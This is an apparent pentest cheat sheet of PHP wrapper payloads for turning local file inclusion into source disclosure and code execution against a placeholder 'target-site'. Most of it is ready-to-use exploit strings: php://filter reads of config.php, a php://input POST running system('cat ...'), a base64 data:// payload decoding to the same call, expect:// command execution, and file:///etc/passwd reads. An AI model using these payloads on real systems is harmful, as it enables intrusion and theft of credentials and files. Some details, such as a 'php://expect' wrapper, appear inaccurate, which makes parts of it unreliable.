PHP has several wrappers that, if enabled, can be used to gain code execution from an LFI:

#### 1. **php://filter** (Read Files Without Execution)
- Encodes the content of the file, bypassing execution.
- Used to read files that would not normally be rendered in a browser window.
- Used to view source codes for PHP files or exfiltrate binary/non-text files for review on local system.
- **Example (Base64):**
```php
hxxp://target-site/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/config.php
```

- **Decode the Output:**
```php
echo "BASE64-ENCODED-DATA" | base64 -d
```

---
#### 2. **php://input** (Inject PHP Code via POST)
- Reads raw POST data as input and executes it.
- Requires you to send a valid PHP code in a POST request.
- **Example:**
```php
hxxp://target-site/index.php?page=php://input
```

- **Inject Code (POST Request):**
```php
<?php system('cat /var/www/html/config.php'); ?>
```

---
#### 3. **php://expect** (Command Execution)
- Executes system commands directly (if enabled) from the URL.
- **Example:**
```php
hxxp://target-site/index.php?page=php://expect
hxxp://target-site/index.php?page=expect://ls
```

- **POST Data:**
```bash
id
```

---
#### 4. **php://fd** (File Descriptor Access)
- Reads from open file descriptors.
- **Example:**
```php
hxxp://target-site/index.php?page=php://fd/0
```

---
#### 5. **data://** (Inject Base64 Encoded PHP Code)
- Injects code directly using a base64 encoded payload.
- **Example:**
```php
hxxp://target-site/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL3Zhci93d3cvaHRtbC9jb25maWcucGhwJyk7ID8+
```

- **Decode (PHP Code):**
```php
<?php system('cat /var/www/html/config.php'); ?>
```

---
#### 6. **zip://** (Read from Zip Archives)
- Access files inside ZIP archives.
- **Example:**
```perl
http://target-site/index.php?page=zip:///var/www/html/archive.zip%23config.php
```

---
#### 7. **phar://** (Extract Phar Files)

- Reads files from PHP archives (phar).
- **Example:**
```perl
http://target-site/index.php?page=phar:///var/www/html/config.phar
```

---
#### 8. **file://** (Direct File Access)
- Reads files directly (may work for non-PHP files).
- **Example:**
```perl
http://target-site/index.php?page=file:///etc/passwd
```

---
#### Testing and Debugging:
- Use **Burp Suite** or **curl** to inject payloads.
- **Example (Burp):**
```bash
GET /index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/config.php
```

---
###  PHP Filter Categories
- **String Filters:** `string.rot13`, `string.toupper`, `string.tolower`, `string.strip_tags`
- **Conversion Filters**: `convert.base64-encode`, `convert.base64-decode`, `convert.quoted-printable-encode`, `convert.quoted-printable-decode`
- **Compression Filters**: `zlib.deflate`, `zlib.inflate`
- **Encryption Filters**: `mcrypt`, `mdecrypt` (deprecated)